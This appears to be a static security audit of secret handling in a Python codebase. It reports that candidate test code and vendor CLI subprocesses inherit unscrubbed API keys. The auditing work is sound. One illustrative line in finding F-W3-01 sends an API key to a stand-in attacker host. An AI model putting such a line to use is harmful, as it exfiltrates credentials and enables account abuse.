# W3 findings — secret handling and leak paths

Base: local main 851ff43c. Scope: daedalus/ (kernel + providers + eval + spine +
kernel/hermes integration). Excluded per instructions: vault/, .quarantine/,
daedalus/lanes/, .claude/worktrees/, .daedalus_worktrees/, build/,
apps/web/src-tauri/backend/, apps/web/src-tauri/target/. apps/web frontend was
not swept (out of W3's declared scope: secret handling in the Python kernel).

## Enumeration

Greps run:
- `os\.environ|os\.getenv` over `daedalus/**/*.py` → **176 occurrences across 61
  files**. `os.getenv` itself: 0 direct hits — every read goes through
  `os.environ.get(...)` / `os.environ[...]`.
- `os\.environ\.get\(["'][A-Z_]*(TOKEN|SECRET|PASSWORD|CREDENTIAL|_KEY|AUTH)[A-Z_]*["']\)` →
  isolated the credential-shaped subset.
- `redact|scrub|sanitiz|mask_secret|SecretStr` (case-insensitive) → 17 files,
  reviewed all.
- `subprocess\.(run|Popen|call|check_output)` over `daedalus/` → 49 files spawn
  child processes; the ones that can run untrusted/candidate code or a vendor
  model CLI were read in full (codex_cli.py, claude_bridge.py,
  kernel/attempt_execution.py, eval/correctness.py, kernel/promotion_trust_root.py,
  integrations/hermes/runtime_adapter.py + configuration.py).
- `api_key` (case-insensitive) over `daedalus/**/*.py` → traced every call site
  from env read to HTTP header to confirm no logging/repr path.
- `blocked_external|DeploymentPlan|signing_key|store_account` → checked whether
  §7.1's Genesis release-credential machinery exists in code at all.

Credential-shaped env names actually read in `daedalus/` (8 distinct
names/prefixes): `DEEPSEEK_API_KEY`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`,
`DAEDALUS_OWNER_APPROVAL_SECRET` (+ `_CANARY` variant), `DAEDALUS_APPROVAL_SECRET`,
`DAEDALUS_PROMOTION_SECRET`, `AUTH_TOKEN_ENV` → `"DAEDALUS_DESKTOP_AUTH_TOKEN"`-style
token (`daedalus/interfaces/http/server.py`), `DESKTOP_STARTUP_NONCE_ENV`
(startup nonce). `CODEX_MODEL`, `OLLAMA_HOST`, etc. are configuration, not
credentials, and are excluded from this count.

Sinks checked for secret-value reachability: CAS put (`kernel/artifacts.py`),
receipt/evidence construction (`kernel/attempt_execution.py`,
`integrations/hermes/runtime_adapter.py`), provider HTTP client
(`providers/_openai_compat.py`), provider classes (`deepseek.py`, `codex_cli.py`,
`ollama.py`), candidate-execution child-process spawns (`eval/correctness.py`,
`kernel/attempt_execution.py::_command_gate`, `kernel/promotion_trust_root.py`),
vendor-CLI spawns (`claude_bridge.py`, `codex_cli.py`), env-status API surface
(`env.py`, `doctor.py`), owner-approval CLI (`kernel/approvals.py`).

### Redactor coverage table

| Sink | Mechanism | Coverage |
| --- | --- | --- |
| `daedalus/env.py::env_status` (status API surface) | returns `{"configured": bool(...)}` only for `SECRET_KEYS` | COVERED — no value ever leaves this function |
| `daedalus/providers/_openai_compat.py::_post` (HTTP client) | key goes only into `Authorization` header; error paths log response body/URL, never headers | COVERED |
| `daedalus/providers/deepseek.py` | `self.api_key` used only as a kwarg into `chat_completion`; never logged/repr'd | COVERED |
| `daedalus/integrations/hermes/configuration.py::build_sanitized_environment` | explicit **allowlist** of env names (ordinary + secret), everything else dropped | COVERED (best-practice pattern in this codebase) |
| `daedalus/kernel/promotion_trust_root.py::scrubbed_child_env` | denylist of 3 prefixes: `DAEDALUS_OWNER_APPROVAL_SECRET*`, `DAEDALUS_APPROVAL_SECRET*`, `DAEDALUS_PROMOTION_SECRET*` | **PARTIAL** — strips only promotion secrets, not `DEEPSEEK_API_KEY`/`ANTHROPIC_API_KEY`/`OPENAI_API_KEY` or any operator-exported secret outside those 3 prefixes |
| `daedalus/kernel/attempt_execution.py::_command_gate` (canonical candidate-code gate, Low-integrity child) | calls `scrubbed_child_env()` | **PARTIAL**, inherits the gap above |
| `daedalus/eval/correctness.py::_spawn_pytest` (SWE-bench-style FAIL_TO_PASS/PASS_TO_PASS correctness gate) | `env = dict(os.environ)` | **UNCOVERED** — no scrubbing of any kind, not even the 3 promotion-secret prefixes |
| `daedalus/claude_bridge.py` (spawns `claude` CLI) | `subprocess.run(cmd, cwd=..., ...)`, no `env=` | **UNCOVERED** — full parent env inherited |
| `daedalus/providers/codex_cli.py` (spawns `codex exec`) | `subprocess.run(cmd, cwd=..., ...)`, no `env=` | **UNCOVERED** — full parent env inherited |
| `daedalus/kernel/artifacts.py::store_canonical_json` (CAS put) | none — persists whatever `Mapping` payload it is given | N/A — no redaction layer exists here at all; safety depends entirely on callers never putting secret values in a CAS payload (none observed doing so, but nothing would stop it) |

## Findings

### F-W3-01 Candidate correctness-gate spawns test code with the full, unscrubbed parent environment and no confidentiality containment
- **file:line**: `daedalus/eval/correctness.py:508-567` (`_spawn_pytest`), called from
  `daedalus/eval/correctness.py:580-602` (`run_node_ids`), wired as the gate body
  in `daedalus/eval/correctness.py:1641-1690` (`correctness_gate`), which
  `daedalus/kernel/attempt_execution.py` accepts via `evaluator_port.correctness_gate`
  as an alternative to `pytest_gate`/`command_gate`.
- **class**: secret-to-model-context (candidate execution context) / missing-redaction
- **severity**: CRITICAL
- **status**: CONFIRMED with quoted code
- **evidence**:
  ```
  # daedalus/eval/correctness.py:523
  env = dict(os.environ)
  env["COLUMNS"] = "200"          # keep long node ids on one line
  ...
  # :538-542 (preferred path)
  proc = ManagedProcess(list(argv), cwd=str(cwd), env=env,
                        stdout=fh, stderr=subprocess.STDOUT)
  containment = "job_object"
  ...
  # :560-563 (fallback path)
  done = subprocess.run(list(argv), cwd=str(cwd), env=env,
                        stdout=fh, stderr=subprocess.STDOUT,
                        timeout=timeout_s)
  ```
  `ManagedProcess` here is a Windows Job Object — the module's own containment
  doc (`daedalus/spine/containment.py:104-109`) states this is "A RESOURCE
  BOUND, NOT A SECOND SECURITY BOUNDARY." Unlike `kernel/attempt_execution.py`'s
  `_command_gate` (F-W3-02), this path never calls `containment.label_low_integrity`
  or `containment.spawn_contained`, and never calls `scrubbed_child_env()` —
  `os.environ` is copied verbatim, including any `DEEPSEEK_API_KEY`,
  `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, or `DAEDALUS_*_SECRET` set in the
  operator's shell.
- **reachability**: `correctness_gate` is a first-class gate constructor
  documented as `"a gate callable for daedalus.spine.attempt.TaskAttempt"`
  (docstring at `correctness.py:1644-1650`) and is selected by
  `TaskAttempt.__init__` in `kernel/attempt_execution.py` whenever
  `task.fail_to_pass or task.pass_to_pass` is set (SWE-bench-style tasks) — this
  is the canonical FAIL_TO_PASS/PASS_TO_PASS evaluator path called out in
  Gate-2/Gate-3 of the master plan, not a legacy or disposable script. The code
  that runs under this gate is candidate/attempt code — exactly the population
  the isolation invariant (master plan §4 invariant 3) is written for.
  `daedalus/spine/containment.py:93-99` independently documents that even the
  *contained* sibling path has "CONFIDENTIALITY: NONE... Nothing here prevents
  exfiltration" and "NETWORK: unrestricted" — so a real key present in this
  env is one `requests.get("https://attacker/?k=" + os.environ["DEEPSEEK_API_KEY"])`
  inside candidate/test code away from leaving the machine, with no isolation
  layer in this specific gate to stop it.

### F-W3-02 `scrubbed_child_env` — the name implies a general secret scrubber; it only strips 3 promotion-secret prefixes
- **file:line**: `daedalus/kernel/promotion_trust_root.py:176-180` (`SECRET_ENV_PREFIXES`),
  `:244-261` (`scrubbed_child_env`); consumed by
  `daedalus/kernel/attempt_execution.py:1032-1046` (`_command_gate`'s
  Low-integrity candidate-code spawn) and `:489-502` (`_git_env`, used for every
  git subprocess the kernel spawns against a candidate worktree).
- **class**: missing-redaction (partial)
- **severity**: HIGH
- **status**: CONFIRMED with quoted code
- **evidence**:
  ```
  # promotion_trust_root.py:176-180
  SECRET_ENV_PREFIXES = (
      "DAEDALUS_OWNER_APPROVAL_SECRET",
      "DAEDALUS_APPROVAL_SECRET",
      "DAEDALUS_PROMOTION_SECRET",
  )
  ...
  # :256-261
  env = dict(os.environ if base is None else base)
  for name in list(env):
      upper = name.upper()
      if any(upper.startswith(prefix) for prefix in SECRET_ENV_PREFIXES):
          del env[name]
  return env
  ```
  This is the function the kernel calls for "no promotion secret reaches the
  child" (`attempt_execution.py:1024-1030` docstring, explicit about exactly
  that threat). It says nothing about, and does not strip,
  `DEEPSEEK_API_KEY`/`ANTHROPIC_API_KEY`/`OPENAI_API_KEY`, or any other
  operator secret that does not start with one of the 3 listed prefixes.
- **reachability**: same candidate-code-execution boundary as F-W3-01, but on
  the path that *is* Low-integrity-contained (`_command_gate`). Per
  `spine/containment.py:93-99` (quoted above), the containment on this path is
  write-only ("MIC is a write-UP barrier") — it does not stop the contained
  child from reading its own environment or making network calls, so a
  provider API key present here is reachable by candidate code exactly as in
  F-W3-01, just through the gate that is *supposed* to be the hardened one.

### F-W3-03 Vendor model-CLI subprocesses (`claude`, `codex exec`) inherit the full parent environment
- **file:line**: `daedalus/claude_bridge.py:323-332` (`local_subprocess.run(cmd, cwd=repo_root, ...)`,
  no `env=`); `daedalus/providers/codex_cli.py:246-262` (`subprocess.run(cmd, cwd=repo_root, ...)`,
  no `env=`).
- **class**: secret-to-model-context (spawned model-CLI env inheritance, named
  explicitly in the task brief)
- **severity**: MEDIUM
- **status**: CONFIRMED with quoted code
- **evidence**:
  ```
  # claude_bridge.py:323-332
  completed = local_subprocess.run(
      cmd,
      cwd=repo_root,
      text=True,
      encoding="utf-8",
      errors="replace",
      capture_output=True,
      timeout=timeout_s,
      check=False,
  )
  ```
  ```
  # codex_cli.py:246-262
  completed = subprocess.run(
      cmd, cwd=repo_root, text=True, capture_output=True,
      encoding="utf-8", errors="replace",
      stdin=subprocess.DEVNULL,
      timeout=effective_timeout, check=False,
  )
  ```
  Neither call passes `env=`; Python `subprocess.run` defaults to inheriting
  the calling process's complete environment. Contrast with
  `integrations/hermes/runtime_adapter.py:358` (`build_sanitized_environment`,
  an explicit allowlist) and `promotion_trust_root.py`'s `_hardened_env` for
  git — both deliberately construct a bounded child env; these two provider
  spawns do not.
- **reachability**: every `claude`/`codex` invocation from `router.py`/`offload.py`
  fan-out. Lower severity than F-W3-01/02 because these are trusted first-party
  vendor CLIs (not adversarial candidate code) and each manages its own
  separate auth (Claude subscription session, `codex login` ChatGPT auth) —
  they do not need `DEEPSEEK_API_KEY`. The risk is indirect: any other secret
  an operator happens to export in this shell (this is a general-purpose
  Administrator dev box per `git status`) is visible to the vendor binary's
  process table/crash dumps/debug logging, which this repository does not
  control.

### F-W3-04 §7.1's "credentials remain local and outside model context and CAS" has no implementing code to evaluate for the Genesis release path
- **file:line**: `docs/IKARUS_ARIADNE_MASTER_PLAN.md` §7.1 (last paragraph);
  no corresponding implementation found under `daedalus/` for `DeploymentPlan`,
  `blocked_external`, `signing_key`, or `store_account` (grep hit only
  `daedalus/runtimes/provider_invocation_abi.py`, which is an unrelated
  provider-invocation-authority signing key, not a release/store credential).
- **class**: overclaim
- **severity**: LOW (documentation-ahead-of-code, not a live violation)
- **status**: CONFIRMED absence of implementation (not a code bug — there is no
  code to be wrong)
- **evidence**: the quoted plan text: *"Missing runners, signing keys, or store
  accounts terminate publishing as blocked_external; credentials remain local
  and outside model context and CAS."* None of `DeploymentPlan`,
  `DeploymentReceipt`, `blocked_external`, a signing-key store, or a
  store-account concept exists anywhere in `daedalus/`.
- **reachability**: N/A — the claim is currently true only because the
  publishing/signing surface it describes has not been built yet, not because
  a mechanism enforces it. This is a plan/reality gap, not an exploitable
  path. Distinct from F-W3-01..03, which are about the general "credentials
  stay outside model context" spirit for the *implemented* candidate-evaluation
  surface, where it does not hold.

## Overclaim hunt — verdict

The system-wide "credentials remain local and outside model context and CAS"
framing does **not** hold statically for the parts of the system that exist
today: F-W3-01 and F-W3-02 show that candidate/attempt code — which is
literally the model-context-adjacent execution surface the invariant is meant
to protect (master plan §4 invariant 3, "Isolation... candidate execution is
capability-bounded and cannot modify its evaluator, policy, evidence...") —
runs with real provider API keys reachable in its process environment, and
`daedalus/spine/containment.py` itself documents, in its own words, that
nothing in the write-containment it provides stops that data from leaving
("CONFIDENTIALITY: NONE... NETWORK: unrestricted"). Where a scrubbing
mechanism exists at all (`scrubbed_child_env`, `build_sanitized_environment`),
it is real and independently good design for what it targets — but
`scrubbed_child_env`'s name is broader than its behavior, and the alternate
correctness gate (`eval/correctness.py`) does not call it at all. This is
enforced by convention/caller-discipline on the uncovered sinks, not by a
mechanism.

## What I did not cover

- apps/web (frontend/Tauri) secret handling — out of the declared W3 scope
  (Python kernel secret paths); a different worker's territory unless
  reassigned.
- Runtime/live behavior — everything above is static reading; no code was
  executed, no live `DEEPSEEK_API_KEY`/`ANTHROPIC_API_KEY` was set or observed
  on this box, and no exfiltration was actually attempted.
- The full 49-file subprocess-spawn list was not read line-by-line; only the
  ones that can carry candidate code or a model-vendor CLI were traced in
  depth (see Enumeration). The remainder are chip_design/EDA toolchain
  spawns, doctor/health probes, and worktree/git plumbing not identified as
  candidate/model-facing from their names and callers.
- `daedalus/tools/vet.py` (`API_KEY=x` MCP-spec parsing) was read only in
  passing; it is about hashing/normalizing an MCP server spec's own `env`
  field for identity purposes, not a leak path, but was not fully traced.
- Did not re-report the three excluded known gaps (prompts are not
  boundaries; shelled delegate bypasses the spend ledger;
  `security_boundary_claimed` is deliberately false).
